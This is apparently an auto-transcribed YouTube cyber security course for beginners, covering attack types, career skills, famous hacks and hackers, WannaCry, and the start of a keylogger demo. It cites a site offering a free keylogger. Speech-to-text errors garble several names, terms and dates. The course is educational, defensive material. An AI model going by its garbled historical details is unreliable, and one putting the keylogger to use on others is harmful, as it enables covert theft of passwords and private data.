hey everyone welcome to this informative
video on cyber security full course this
full course will acquaint you with
various cyber security concepts from
scratch if you are a beginner in this
field not to worry you are at the right
place
this cyber security tutorial for
beginners will guide you through your
cyber security journey cyber security is
gaining popularity more than ever given
the current covert 19 scenario and the
entire world becoming virtual
according to a research study by deep
instinct ransomware increased by 435
percent in 2020 compared with 2019.
these numbers show that this is likely
to increase in 2021 and in the future
this shows how crucial it is to have
cyber security to put an end to such
cyber attacks
now let's go ahead and get started with
our learning journey
here we will understand cyber security
cyber attacks cryptography and also look
into ethical hacking we'll begin the
cyber security tutorial for beginners
course with an interesting introduction
to cyber security
following which we will have a look at
the top five skills that are required
for your cyber security career
next we will look at the different types
of cyber attacks and then understand the
importance of cyber security and what
cyber security is all about
moving forward we will look into the
concept of ethical hacking along with a
hands-on demo for each type of cyber
attack
next we will acquaint you with the
concept of cryptography
following this we'll briefly introduce
you to the various cyber security
certifications available today along
with cyber security career prospects the
certifications we will be talking about
are the comptia security plus
certification
the ch certification along with the
roles and responsibilities of a
certified ethical hacker and the
world-renowned cissp certification
we will then conclude this cyber
security pool course with a set of the
top 50 cyber security interview
questions and answers that can help you
crack your cyber security interview
for this training with me i have our
experience cyber security specialists
bipin and bever and together we will
take you through the various topics in
cyber security cryptography and ethical
hacking all of this in under 12 hours
but before we begin make sure to
subscribe to our youtube channel and hit
the bell icon to never miss an update
from simply learn so let's start off
with an interesting short video on cyber
security
with just one click you can shop online
make online bake transfers like a post
on instagram and much more
as convenient and exciting as it sounds
have you ever wondered how unsafe it
could be to live in this digital era
is our data well protected
well no
to help us tackle this issue we have
cyber security to our rescue
cyber security is the art of protecting
our networks and devices from
unauthorized access
when i say unauthorized access here it
would refer to a small or big cyber
attack or a cyber threat
there are various types of cyber attacks
that you can fall prey to phishing
malware attack ddos attack password
attack and many more
a few ways to implement cyber security
are defining clear boundaries using
network security control devices like
firewalls and ids and carrying out
security testing
at any point in time the cia that is
confidentiality integrity and
availability are being implemented in an
organization to ensure that our
information is secure there is a great
demand for professionals like ethical
hackers cisos and many more cyber
security experts who can implement cyber
security and safeguard an organization's
data
so what are you waiting for get
certified with simply learn and began
your lucrative cyber security career
this was cyber security in short meet
anne
she often shops from
www.shoppingcart.com
she has her information like email id
address and credit card details saved on
the website to enable a faster and
hassle-free shopping experience
the required information is stored in a
server
one day anne received an email which
stated her eligibility for a special
discount voucher from shoppingcart.com
in order to receive the coupon code she
was asked to fill in her
shoppingcart.com account credentials
this didn't seem fishy to her at the
time as she thought it was just an
account verification step
little did she realize the danger she
would be facing
she was knocked off her feet when a
substantial amount of money was wiped
off her account
how do you think this happened
well yes the email she received was fake
anne's shoppingcart.com account
witnessed unauthorized access from a
third party
this type of attack is known as a cyber
attack and the person who carries it out
is called a hacker
could anna prevented this attack
indeed she could have
with the help of cyber security
cyber security involves techniques that
help in securing various digital
components networks data and computer
systems from unauthorized digital access
there are multiple ways to implement
cyber security depending on the kind of
network you are connected to and the
type of cyber attacks you are prone to
so let's take a look at the various
cyber attacks that anne could have been
exposed to
one of the most common types of cyber
attacks is a malware attack like trojan
adware and spyware
to name a few
had ann downloaded any suspicious
attachments online her system could have
gotten corrupted by certain malicious
viruses embedded within the attachments
next is a phishing attack the type of
cyber attack which ann experienced
here the hacker usually sends fraudulent
emails which appear to be coming from a
legitimate source
this is done to install malware or to
steal sensitive data like credit card
information and login credentials
another type of attack is the man in the
middle attack
here the hacker gains access to the
information path between ann's device
and the website's server the hacker's
computer takes over anne's ip address by
doing so the communication line between
ann and the website is secretly
intercepted
this commonly happens with unsecured
wi-fi networks and also through malware
password attack is one of the easiest
ways to hack a system
here anne's password could have been
cracked by using either common passwords
or trying all possible alphabetical
combinations
to prevent future cyber attacks and
sought to implement a few cyber security
practices
first she installed a firewall as the
name suggests it is a virtual wall
between anne's computer and the internet
firewalls filter the incoming and
outgoing traffic from your device to
safeguard your network and they can
either be software applications or
hardware reinforcements
secondly and implemented honeypots just
like how flowers attract bees dummy
computer systems called honeypots are
used to attract attackers these systems
are made to look vulnerable in order to
deceive attackers and this in turn
defends the real system
in addition to these she also decided to
use unique alphanumeric passwords
antivirus software and started avoiding
males from unknown senders
that was ann's story
cyber attacks are not just confined to
individuals but also to public and
private organizations
the cyber attacks carried out in such
places are more deadly and they result
in colossal losses
motives of such attacks are many
starting from tampering with crucial
data to monetary gains
let's have a look at a few of the cyber
attacks that companies are subjected to
various public sector organizations and
large corporations face the advanced
persistent threat apt
in this form of attack hackers gain
access to networks for a prolonged
period in order to continuously gain
confidential information
companies also witness the denial of
service attack where networks are
flooded with traffic which in turn
leaves legitimate service requests
unattended a variant of this is the
distributed denial of service ddos
attack when multiple systems are used to
launch the attack
when a hacker manipulates a standard sql
query in a database driven website it is
known as a sql injection attack by doing
so hackers can view edit and delete
tables from databases
amidst a plethora of cyber attacks it is
indeed a challenge for organizations
with several networks and servers to
ensure complete security this is not an
easy task and to help with this cyber
security professionals are hired to work
on identifying cyber threats and
securing a company's network
there are multiple job roles in the
field of cyber security if hacking
fascinates you then the role of an
ethical hacker is something to be
explored
such professionals try to a network's
vulnerabilities just like how a hacker
would do
but only to identify those
vulnerabilities and resolve them for
protection against an actual cyber
attack
but if you are looking to design robust
security structures then the role of a
security architect is more apt
a chief information security officer
ciso plays a crucial role in enterprise
security and is entrusted with the
overall safety of the information in an
organization with the increase in the
production of global digital data it is
anticipated that cyber attacks will
quadruple in the near future
organizations are going to need
cybersecurity professionals who can
prevent these attacks
a career in the field of cybersecurity
is lucrative and a very smart decision
for professionals now
so
what are you waiting for get certified
with simplylearn and become a
cybersecurity expert
with businesses moving online and
shifting to cloud storage currently the
demand for cyber security is at its peak
with that comes a high demand for cyber
security experts who can safeguard
digital data
according to cybercrime magazine by
cybersecurity ventures globally there
would be nearly 3.5 million unfilled
cybersecurity jobs by 2021 and the
number of internet users will hit a
whopping 6 billion by 2022
these numbers speak volumes and this
shows the growing demand for cyber
security professionals across the globe
now that you know the high demand for
cyber security professionals let us help
you start your cyber security career by
bagging the right skill set
many of you out there might be waiting
to become a cyber security professional
but are unsure of how to go about it and
what skills you would need to get a
cyber security job
not to worry we are here to help you
with that after extensive research we
have come up with the top five skills
that will help you get into the field of
cyber security let's have a look at
these skills individually
first we have networking and system
administration
the number one skill you need to have to
enter the field of cyber security is
computer networking
networking is the backbone of the
internet it is imperative that you have
an in-depth understanding of networking
to start a career in cyber security
a network is a group of interconnected
devices and networking is the art of
understanding how data is sent
transmitted and received amongst these
devices
you need to know various routing
protocols the tcp and osi models govern
networking the osi model is
comparatively newer
basically in these models all the
protocols are grouped into layers and
work together to help you receive data
on your device sent from a server
learning networking will help you
understand the technical aspects of data
transmission which will help you secure
your data
you can take up networking
certifications like security plus and
cisco ccna to gain a strong networking
foundation
another skill that will be beneficial
for you is to master system
administration
if you think about it all of us assist
admins at some level
system administration is all about
configuring and maintaining computers
you must be curious to know every aspect
of your computer features and settings
and play around a bit
carry out a trial and error method and
give yourself small tasks like
recovering deleted files or monitoring
old viruses on a vm
explore new techniques put them into use
and expand your knowledge
let us now move on to our second skill
knowledge of operating systems and
virtual machines
to become a cyber security professional
you need to have a strong knowledge of
operating environments such as windows
linux and mac os
cybersecurity professionals largely use
linux and it comes with several tools
to learn operating systems go ahead and
set up and use virtual machines that is
vms and play around with them this will
help you gain hands-on experience
as a cyber security expert you should be
comfortable working on any os
vms allow you to train and research in
an isolated environment and help you
maximize your skills
the next point to remember is to know
kali linux
it is the most widely known linux
distribution for ethical hacking and
penetration testing
it comes with several hundred tools
related to penetration testing malware
analysis security research computer
forensics and so on
kali contains several projects and you
can learn a lot another good thing about
kali is that it is free to use so what
are you waiting for download and start
right away
remember that linux is the backbone of
cyber security and a commonly asked
topic for cyber security interviews
especially for pen testing roles
moving on to our third skill
our third skill is network security
control
it is another basic skill that every
cyber security professional should have
network security control refers to the
different measures which are employed to
enhance the security of a network
it is simple you can only safeguard your
network if you know how it works how
routers firewalls and other devices work
a firewall is a hardware or software
that blocks incoming or outgoing traffic
from the internet to your computer
firewalls are required to secure a
network as a cyber security expert you
must be able to leverage a firewall to
filter and prevent unauthorized traffic
onto the network
in addition to that as a cyber security
expert you must know about intrusion
detection systems intrusion prevention
systems virtual private networks and
remote access
an intrusion detection system ids is
designed to detect unauthorized access
to a system
it is used together with a firewall and
a router
you should be able to operate the ids
and recognize any security policy
violations and malicious traffic on the
network
as many of you may have used a vpn is a
connection between a vpn server and a
vpn client it is a secure tunnel across
the internet
moving on next up we have an interesting
skill any idea what that is if yes pause
and leave a comment as to what you think
the next skill will be
if getting your learning started is half
the battle what if you could do that for
free visit scale up by simply learn
click on the link in the description to
know more
and before we jump into this skill if
you find this video interesting make
sure to give it a thumbs up
fourth skill on our list is coding
so you might be wondering if coding is
really required to become a cyber
security professional well it is true
that not all cyber security
professionals have or need coding skills
however having zero coding knowledge may
limit your opportunities in the future
knowing a couple of programming
languages will help you identify the
plan behind an attack and defend against
deadly hacking techniques
so as seen on your screens these are the
best programming languages to learn to
make your cyber security career
worthwhile
we have c and c plus plus the c
programming language is the backbone of
most operating systems c and c plus plus
are low programming languages that you
need to know as a cyber security
professional
on the other hand python is a high-level
programming language that is becoming
popular among cyber security experts
today knowing python will give you an
upper hand in your career it will help
you identify and fix vulnerabilities
javascript is another high-level
programming language that adds
interactivity to web pages
a good advantage of knowing javascript
is that you can prevent cross-site
scripting attacks from occurring
as in these attacks the attacker
implants malicious code in a web
application speaking of php because most
of the websites are created using php
learning it will help you defend against
intruders
html is another language cyber security
professionals should understand as most
websites use it and it is one of the
easiest languages to learn
another programming language that you
can use is golang it is great for
cryptography you can solve various cyber
security problems with it
then we have sql that is structured
query language
attackers use this language to damage
the stored data one such example is the
sql injection attack hence having a good
understanding of sql will be highly
beneficial
another point we'd like to highlight is
to have knowledge of assembly language
this will help you become a cyber
security engineer assembly will help you
understand how malware functions and
thereby help you defend against it in
the cyber security domain you can't just
lock into a single language and hence it
is advised that you're acquainted with a
couple of them
you can also do a crash course for these
languages and learn them
hence determine the best programming
language for your cyber security role
and get familiar with the basics
moving on our fifth skill on the list is
cloud security
there is a growing demand for cyber
security professionals with cloud
security skills in the coming years
companies are on the lookout for
professionals with security skills
applicable to public and hybrid cloud
platforms such as amazon web services
and azure
more organizations look to cloud
infrastructure to store data and run
applications
this includes the implementation of
policies and technologies that protect
cloud-based systems and devices
just like application development
security cloud security also involves
building secure systems from the start
companies want professionals who can
manage the cloud security tools to
identify and prevent any cloud breaches
people with experience and knowledge in
managing big platforms such as microsoft
azure aws and the gcp are in high demand
now that we have seen the top five cyber
security skills let us go through a set
of additional skills that can help you
get into the cyber security field
remember that to become a successful
cyber security expert you must possess a
rich and diverse skill set
so in a list of additional skills first
we have risk analysis
identifying risks even before their
arrival is a great skill cyber security
professionals are required to identify
manage and mitigate risks
risk management and mitigation is a
skill set that is going to be highly in
demand in the coming years
next we have information security
companies require skilled professionals
who can protect their electronic data
from unauthorized access
here in demand skills are authentication
authorization malware analysis and data
recovery
next on our list is security incident
handling and response
as a cyber security expert you must be
prepared to handle any forthcoming
threat of violating an organization
security policy
by following an updated incident
response plan your team can proactively
protect your data and minimize the
damages
in security incident management you are
required to identify manage record and
analyze security threats in real time
a security incident can be an active
threat or a successful compromise of
data or an attempted intrusion
it can also be incidents like ddos
attacks phishing apts ransomware and
many more
another important pointer is that as a
security practitioner you must also
manage and analyze the security
information and event management siem
tools and services
moving on we have security audit
security auditing is an internal check
that is carried out to find flaws in the
organization's information system you
must be able to conduct a review of the
organization's adherence to regulatory
guidelines
security audit and compliance knowledge
are very crucial as any mistake of
regulatory compliance could lead to
hefty penalties
soon organizations will need people who
are more familiar with the various data
privacy regulations if you are good at
paperwork you can capitalize on this
skill companies will need people who can
understand what paperwork to file and
which security protocols to use to
comply with the regulations
finally we have loss and regulations and
often overlooked cybersecurity aspect
there are several cybersecurity laws and
regulations and if you break these laws
intentionally or not it doesn't matter
as you will still be charged these laws
define how you can use the internet and
it also defines how people can be
protected from becoming the victims of
cyber crimes
knowing these laws and regulations and
following the best practice will make
you ethical at your job and this will in
turn be good for your organization so
those were our list of additional skills
apart from these make sure you stay
updated with new hacks and learn new
tools as cyber security is ever evolving
another important skill apart from these
technical skills is your soft skills
having a set of good soft skills will
help you bag your dream job
we have a video on the top 5 soft skills
that will help you grow in your career
do watch that and incorporate those
skills as well we bring you the top 10
computer hacks of all time let's see
what we have at number 10.
from april 27 2007 estonia the european
country faced a series of cyber attacks
that lasted for weeks
this happened when the estonian
government decided to move the bronze
soldier from talon center to a less
prominent military cemetery located on
the city's outskirts
unprecedented levels of internet traffic
took down estonian banks online services
media outlets broadcasters and
government bodies
botnets sent massive waves of spam and
vast amounts of automated online
requests
according to researchers the public
faced ddos attacks there were conflicts
to edit the english language version of
the bronze soldiers wikipedia page as
well
although there is no confirmation russia
is believed to be behind these cyber
attacks that largely cripples the
estonian society
let's now move on to the next attack on
december 23 2015 several parts of
ukraine witnessed a power outage and
this was not a typical blackout it was
indeed the result of a cyber attack
information systems of three energy
distribution companies in ukraine were
compromised it is the first known
victorious cyber attack on a power grid
it is said that here hackers sent out
phishing emails to the power companies
30 substations were switched off and
about 230 000 people were left in the
dark for about one to six hours us
investigators believed that russia-based
hackers were responsible for this
experts have warned that other countries
could also be vulnerable to such attacks
let's see what we have at number eight
in the year 1999 a cyber attack caused a
21 day shutdown of nasa computers
unbelievable isn't it the hacker was
none other than the then 15 year old
jonathan james he first penetrated u.s
department of defense divisions
computers and installed a back door on
its servers this allowed him to
intercept more than a thousand
government emails including the ones
containing usernames and passwords
this helped james steal a piece of nasa
software and crack the nasa computers
that support the international space
station which cost the space exploration
agencies 41 000
as systems were shut down for three
weeks
he was the first person to carry out a
computer hack against the american space
agency
let's now move on to the next attack
in late november 2014 there was a leak
of confidential data from the film
studio of sony pictures
information about sony pictures
employees their emails copies of the
then unreleased sony films future
propositions and other crucial data were
leaked
this cyber attack was carried out by a
hacker group named guardians of peace so
what did the hackers want well they
demanded that sony withdraw its then
upcoming movie the interview this movie
was a comedy story line to assassinate
the north korean leader kim jong-un sony
then decided to cancel the film's
theatrical release due to the threats at
cinema screening the movie
it is indeed hard to trace the roots of
a cyber attack in this case after
evaluation the u.s intelligence
officials arrived at the theory that the
attack was in a way related to the
government of north korea
however north korea had denied the same
moving on to our number six
in december 2006 tjx the u.s retailer
company identified that 45.6 million
debit and credit card details were
stolen
this happened from one of its systems
over 18 months by an unknown number of
intruders it was one of the first
largest ever cyber attacks involving the
loss of personal data
as a result banks in the affected
regions had to reissue and block
thousands of payment cards a group of
hackers did this albert gonzalez being
the mastermind the group was from miami
the place where the tjx heist was
believed to have originated
reports said that the tjx data breach
occurred because of weak web encryption
at two of its marshall stores in miami
next moving on to our top five let us
see what we have at number five
the year 2010 witnessed the discovery of
the deadly computer worm stuxnet
this malware's motive was unlike any
other usual cyber attacks it aimed at
destructing the equipment the computers
controlled
stuxnet came with the deadly purpose of
damaging iran's nuclear infrastructure
it infected more than 200 000 computers
including 14 industrial sites and a
uranium enrichment plant in iran
stuxnet initially spread via microsoft
windows and targeted siemens industrial
control systems
although it was discovered only in 2010
it is believed to have been silently
sabotaging iran's nuclear facilities it
was one of the first discovered malware
that was capable of hampering hardware
systems it largely damaged the
centrifuge of the iranian reactors this
is believed to be a cyber weapon created
by the u.s and the israeli intelligence
although there is no documented evidence
or acceptance by either of the countries
for the same
moving on to number four in the year
2014 home depot was the victim of one of
the deadliest cyber attacks
56 million payment cards were
compromised along with 53 million
customer email addresses stolen
this security breach happened from april
to september 2014.
criminals were believed to have used a
third party vendor's username and
password to enter the perimeter of home
depos network
the attackers were then able to deploy
custom built malware on its
self-checkout systems in the us and
canada
moving on to our top three
as you might be aware the playstation
gaming system is one of sony's most
popular products unfortunately in april
2011 sony executives witnessed abnormal
activity on the playstation network this
resulted in the compromise of
approximately 77 million playstation
users accounts and prevented users of
playstation 3 and playstation portable
consoles from accessing this service
this forced sony to turn off the
playstation network on april 20th on may
4th sony confirmed that personally
identifiable information from each of
the 77 million accounts had been exposed
the outage lasted for 23 days sony
released almost daily announcements
concerning the system outage
in the end sony is believed to have
invested approximately 170 million
dollars to improve the network security
to investigate the attack and to cover
the expenses of caring for the consumers
that had been affected let's now move on
to the next attack at number two in may
2017 one of the most dangerous cyber
attacks took place
it was known as the wannacry ransomware
attack caused by the wannacry crypto
worm the victims were the users that
used the unsupported version of
microsoft windows and those who hadn't
installed the new security update
this did not take place through phishing
like other attacks but through an
exposed vulnerable smb port
the attack originated in asia and then
eventually spread across the globe in a
day more than 200 000 computers were
infected across 150 countries
the wannacry crypto worm locked the
users out of the targeted systems and
encrypted their data the users were
asked for a ransom of 300 to 600 dollars
which had to be paid via bitcoin in
exchange for their data this attack took
a toll on both private and government
organizations it resulted in damages
from hundreds of millions to billions of
dollars
in a matter of few days the emergency
patches released by microsoft halted the
attack also the discovery of a kill
switch prevented the infected computers
from spreading the crypto worm security
experts in a few countries believed that
north korea was behind this attack and
finally let's see what we have at number
one
more than two decades ago in march 1999
the melissa virus a mass mailing macro
virus was released it targeted microsoft
word and outlook based systems and
created considerable network traffic
melissa virus infected computers via
emails the email would look like an
important message well yes it was fake
if the recipient opens the attachments
in the mail and downloads the document
and then opens it with microsoft word a
virus was released on their computers
this would then mass mail itself to the
first 50 people in the victims contact
list and then disable multiple safeguard
features on microsoft word and microsoft
outlook this began spreading like a
wildfire across the internet david l
smith released the virus the virus
caused nearly 80 million worth of
damages it did not steal data or money
however it caused a havoc almost 1
million email accounts were disrupted
worldwide agencies were overloaded and
some had to be shut down entirely and
internet traffic in some locations was
slowed down do you agree with our list
if you're aware of any other great
interesting computer hacks in history do
let us know in the comment section below
according to cyber security ventures the
global cyber crime cost is expected to
grow and reach
10.5 trillion us dollars by 2025. that's
the cost we have to pay for cyber crimes
at number 10 we have johnson james and
cheddar in the year 2006 johnson james
angela of towney california was charged
for controlling huge number of botnets
in other words hijacked computers
this was the first time that a hacker
was sent to prison for the use of botnet
technology and should i use botnets to
compromise more than 400 000 computers
advertising companies paid him to
install adware or bots on specified
systems
it is also noted that ancieta advertised
the sale of his spotnets to those
interested in sending spam or launching
ddos attacks without being identified he
was also pleaded guilty for infecting
machines at two u.s military sites which
earned him more than sixty one thousand
dollars johnson james angela was
captured in a well-planned and elaborate
sting operation when fbi agents coaxed
him in their office on the pretext of
collecting computer equipment
he was sentenced to nearly 60 months of
imprisonment and was ordered to pay 15
000 u.s dollars to the u.s federal
government for hacking their military
computers
at number nine we have andrew lammer
lamo began his hacking journey by
hacking games
he was more likely a grey hat hacker who
wanted people to understand the
importance of internet security
however it went far ahead when he hacked
the new york times intranet in 2002. he
was called the homeless hacker for his
transient lifestyle and he often had no
fixed address he used to hack top-notch
accounts by sitting in cafeterias
libraries and so on he was convicted for
compromising security at the new york
times microsoft and yahoo to name a few
he later gained the batch of an american
threat analyst he also appeared on good
morning america fox news democracy now
etc as an expert on net centric crime
and incidents la mo died in the year
2018 at the age of 37. at number eight
we have kevin paulsen a former american
black hat hacker in the hacker community
he is better known as dark dante
at the age of 17 he hacked the us
department of defense but he was left
with a warning as he was a minor later
in 1990 he propelled to stardom for
infiltrating a radio show calling
contest and guaranteeing that he will be
the 102nd caller to win the brand new
porsche 944s 2. the fbi stated
perceiving paulson and was soon arrested
and sentenced to a five years of
imprisonment he was also barred from
using a computer or internet for three
years post his release
later he took into white hat hacking and
journalism in the year 2005 he became a
senior editor of wired news at number
seven we have the famous american hacker
jonathan james better known as comrade
he was the first juvenile in the united
states to be sent to prison for hacking
this famous hack was his intrusion into
the defense threat reduction agency or
dtra computers a division of the united
states department of defense
he installed a back door on its servers
this enabled him to access over 3000
messages from government employees
various usernames passwords and other
confidential data
this helped james steal a piece of nasa
software and this forced nasa to shut
down computers for three weeks to fix
the issue at an estimated cost of 41 000
american dollars he was sentenced to six
months arrest in 2000 he carried out his
hacking using the alias comrade he
specialized in hacking high profile
garment systems however he had a bitter
ending in 2008 moving on to a hacker at
number six
at number six we have anonymous
the anonymous group is an international
decentralized hacktivist movement that
is widely known for its cyber attacks
against several governments its agencies
and the church of scientology this group
is focused on the concept of social
justice the members of this group known
as anons are recognized in public by
wearing guy fox masks
however some members cover their face
without using the well-known masks as
well they are known as being the digital
robin hood amongst its supporters
one of the noted incidents was in the
year 2008 when the group took up issue
with the church of scientology and began
to disable their websites they are also
known for hacking vatican the fbi paypal
sony the cia mastercard visa the israeli
chinese tunisian and ugandan governments
while the law enforcement agencies and
fbi have tracked down a few of the
group's members the lack of any proper
hierarchy makes it almost impossible to
distinguish or eliminate the anonymous
groups as the whole at number five we
have the british du
mata baven and richard price in 1994 the
do hacked into multiple us military
systems including the defense
information system agency griffis air
force base and the korean atomic
research institute they infiltrated into
foreign systems by transferring critical
data of korean automatic research
institute into the united states air
force system in 1996 bavin was arrested
for hacking incidents related to u.s air
force defense manufacturer lockheed nasa
and nato
the pentagon described beaven as the
number one threat to u.s security and
possibly the single biggest threat to
world peace since adolf hitler however
be even claims he was looking to prove a
ufo conspiracy theory in 1997 price was
fined 1200 pounds after pleading guilty
to 12 offenses of gaining unauthorized
access to computer systems in march and
april 1994. having malicious purposes or
not weaven and price displayed that even
military networks are vulnerable now
moving on to our hacker at number four
at number four we have astra
this hacker is a tad bit different from
the others on this list as he has never
been publicly identified the pen name of
this hacker astra is a sanskrit word for
a weapon
in 2008 it was reported that the
authorities apprehended him at that time
he was known as a 58 year old greek
mathematician he had into france's
distort group systems and got his hands
on vulnerable weapons technology data
and then sold it to different countries
for a long period astra was reported to
have sold the data to nearly 250 people
from across the world this in turn
caused the salt 360 million us dollars
of damage
while the astra's real identity was
never discovered officials have said
that he had been wanted since the year
2002.
at number three we have the famous
american computer hacker albert gonzalez
he was responsible for carrying out
multiple hacks
he is accused of masterminding the
biggest fraud in history that is the
combined credit card theft and reselling
of nearly
170 million card and atm numbers from
the year 2005 to 2007. this shows how
unsafe internet banking can be at times
this was recorded to be one of the
biggest credit card thefts in history he
carried out this by installing a sniffer
albert gonzalez is also said to have
been the mastermind of the tjx companies
hack wherein 45.6
million debit and credit numbers were
stolen later in 2010 he was sentenced to
20-year in federal present moving on to
a hacker at number two at number two we
have gary mackinson he is a scottish
systems administrator and hacker accused
of carrying out the biggest military
computer hack of all time in 2002 he
identified himself as solo through an
odd message on a u.s army computer it
was later found to be gary mckinson he
was accused of infiltrating 97 united
states military and nasa computers by
installing virus and deleting a few
files over 13 months between february
2001 and march 2002 this was the biggest
military computer attack of all time
they shut down the us military's
washington network for 24 hours what is
fascinating is his reason that much of
his hacking was in search of information
on ufos
that he believed the us government was
hiding in its military computers and
finally let's see who we have at number
one at number one we have kevin mitnick
the now affluent american entrepreneur
was one of the most wanted cyber
criminal of us once upon a time kevin
who is currently a security consultant
was once convicted of hacking motorola
nokia and pentagon kevin mastered
computer hacking and social engineering
early and got his start as a team in
1982 he hacked north american defense
command this achievement inspired the
1983 film war games in 1989 he hacked
digital equipment corporations network
and made copies of their software it's
largely believed that he once obtained
full control of pacific bell's network
to merely prove that it could be done he
never exported the data he obtained
according to reports midnight gained
unauthorized access to a dozens of
computer networks while he was a
fugitive after five years of
imprisonment midnight started afresh and
became a security consultant his knack
with computers is still remembered all
of these hackers were unbelievably
skilled in cyber code few of them faced
jail in time a few of others ever since
put their cyber skills to better use by
becoming security advisers and helping
humankind hacking skills aren't a form
of criminal behavior if it is put to
good use where organizations have faced
cyber crimes in the recent past the
different types of cyber attacks the
reasons for these cyber attacks and then
we are going to dwelve into what exactly
cyber security what is expected out of
us as cyber security experts to provide
as a cyber security solution then we're
going to look at some basic network
terminologies which will help us
understand cyber security and some of
the terms that are utilized by experts
when we deal with cyber security the
goals that we want to achieve when i say
i want to be secure what exactly do i
mean when i want to secure an
organization what kind of security
parameters are we looking at then we are
going to look at different ways of
tackling cyber crime in today's world
and lastly we've got a very interesting
demo on metasploit where we are going to
test a vulnerable machine and try to
hack it now metasploit is a penetration
testing tool widely used by security
experts and hackers to test and try to
penetrate different systems so we have a
very good demo on that and we'll be
looking at that at the end of this
particular video let's begin with the
rise in cyber crimes so let's talk about
wannacry this is something that happened
way back in 2017 let's not say way back
it's just 2019 two years back and it
took the world by stop so it was a cyber
attack which encrypted the data of
organizations and then the hackers held
that organization ransom by asking of
rather demanding money from them to
decrypt their own data so what exactly
happened the attack originated in asia
and then spread across the rest of the
world note the date and how did this
happen there was a vulnerability that
was identified in microsoft windows the
smb vulnerability smb which is server
message block is essentially the file
sharing and the printer sharing services
that you use in a lan environment on
windows operating system by default
these are enabled on your desktops and
there is a hardening guide that uh
people utilize to to either upgrade the
version of smb to a more secure version
or disable smp and
utilize something else now this was a
known vulnerability and this was
targeted within days more than 230 000
computers when infected across 150
countries now when we say this was
identified microsoft knew of this
vulnerability and in fact they had
released a patch in april of 2017 to
mitigate this vulnerability within two
months of that release this attack had
happened now in a real-world scenario it
is not possible for all the servers and
devices to be upgraded to the latest
patch level because organizations need
to test those patches to see if those
patches are going to interfere with the
services that they are providing and
hence no organization will be completely
patched up at any point in time and this
was the flaw that sadly took down a lot
of organizations the patch was available
but it wasn't testing somewhere not
utilizing it yet and they did not see it
as a high value risk and suddenly
something happened and wannacry took
place now what happened was a crypto
worm called wannacry which basically
encrypts the data and locks the user out
of their own computers and they get a
screen in front of them which says your
data has been encrypted and it gives
them a link and they are they demand uh
300 to 600 to be paid to the hackers to
retrieve the decryption key for their
data now here obviously you're not going
to pay cash to hackers neither are you
going to make a bank transfer because
both of the ways you can identify the
hackers and then pursue them so the
hackers demanded this exchange via
bitcoins cryptocurrency this is the best
way to remain anonymous and the best way
to make payments over the internet
without being identified so what was the
impact of the attack around 200 000 to
300 000 computers were infected now it
sounds like a small number of computers
when we were talking about global
however the services that it affected
were huge in uk the national health
service got affected all the databases
got encrypted surgeries and treatments
of patients were postponed fedex renault
nissan all of these organizations got
compromised and the production lines
basically shut down for a few days till
they retrieved data from backup started
to restore and then tried to bring back
everything to normal then in february
2019 dunkin donuts announced that the
users of their reward programs were
targeted by a credential surfing attack
that means that the attackers stole the
credentials usernames and passwords of
customers of dunkin donuts now we think
dunkin donuts they sell donuts how much
could it impact anyone but if you have
an online account with dunkin donuts you
also have your personal identifiable
information stored in those accounts for
example your name address credit card
information maybe your social security
number or your national insurance card
or something like that which can lead to
identity theft people can misuse that
information pretend to be you and then
take out loans or do transactions in
your name where you are going to end up
paying those bills so stealing of such
kind of data is going to impact all the
users adversely so the first name last
name and email ids were stolen that is
still good enough to launch social
engineering attacks and target these
victims
to phishing attacks or similar attacks
so now let's look at the different types
of attacks in cyber so we are going to
discuss these six malwares we are going
to talk about social engineering attacks
man-in-the-middle attacks denial of
service sql injections and password
attacks now if you look at this malwares
basically target hosts operating systems
social engineering attacks would address
or attack the gullibility of a human
being with the help of a computer for
example sending a fake mail or hosting a
fake website man in the middle attack
would target a network and then try to
capture data packets within the network
thus compromising your credentials a
denial of service attack would crash a
service sql injection attacks would
attack an application and a password
attack would attack the usernames and
passwords of accounts thus taking
advantage of weak passwords and getting
access to your accounts so let's start
with malwares malware basically refers
to malicious software the first part of
malicious mal and the wear out of
software becomes malware malwares are
nothing but vehicles in which hackers
embed payloads payloads could be viruses
worms ransomwares trojans so they hide
these kind of malicious softwares within
legitimate looking softwares and they
post them on the internet people who are
interested in those kind of softwares
will obviously download them and since
they are looking very legitimate they
will try to install them does
accidentally and unknowingly installing
a trojan virus or a ransomware on their
machine now most of us have done this at
one point in time where we have looked
at pirated software because we did not
want to pay for it and then we we
probably go to torrents and then search
for those softwares download them and
there is a keygen.exe over there which
we have to execute and then we have to
copy that code the exe file that comes
out or with the keygen and then we have
to replace it and i mean it's a very
convoluted process but the fact that you
have to restore some code with some
other code would basically mean that
there is something wrong with that file
so 99 percent of the time these programs
would have viruses or trojans embedded
within them and it is going to affect
the security portion of your computers
if you scan keygen.exes with any
antivirus across the globe they will
always report them as malwares and they
will probably want to delete those kind
of files so how do these get infected it
gets infected into a system when the
user clicks on a suspicious link now
obviously if you think it is a
suspicious link you're not going to
click on it but you trust the link or
you're compelled to click on it just out
of curiosity let's say you click on that
link there's a redirector it downloads
an attachment from a malicious server
and it gets installed on your machine
most of the common ways of virus or a
worm is spread is through usb devices
people pass around usb devices like
nobody's business and you have no idea
where the device has been used before
and you plug into your machine and if
there is a virus on that usb device it
will get infected on your machine as
well malwares are nothing but malicious
softwares that pose as legitimate
softwares but will have a virus trojan
or a worm embedded within it right it
could also be a key logger a keylogger
is nothing but another software that is
created to catch all the keystrokes that
the user is making create a copy of it
and store it and send it back to the
hacker so whatever the user is typing it
will now be known to the hacker it could
be bank details passwords any personal
information that the user might want to
keep secret we are going to look at
three different demos here this demo is
just to showcase a couple of things uh
we're going to look at a key logger how
a key logger works this virtual machine
here and i've already downloaded a
keylogger and installed it the idea of
this demo is to showcase how a keylogger
functions right so you can see online on
the screen we are using a free
keylogger.en.softony.com here on this
site and you can download the free
keylogger right from here what i've done
using my demos is that i've always have
a keylogger running in the background to
capture all the keystrokes that i've
been doing whenever i'm doing any demos
so this keylogger here can actually be
hidden in the taskbar but for our demo
purposes have kept it visible when you
click on it it will open up and give you
a basic screen where you can start
navigating about the keylogger now you
can see that on 8th which is today it
already shows some keystrokes
applications and some visited websites
as you can see already been browsing
using the browser over here and which
has been recorded by the keylogger in
the background and just to give you an
example if i click on this file you will
see all the keystrokes that i have been
doing so far and you can see i've gone
to this i've opened up my mozilla
firefox i've typed in a search keyword
of free key logger then i've gone on to
the website how secure is mypassword.net
in which i may have tried out a few
passwords myself and then i've gone and
uh and copy pasted this url into the
browser window and you can see all of
this has been recorded and just to
emphasize on that let's go on to another
website and let's say let's go to
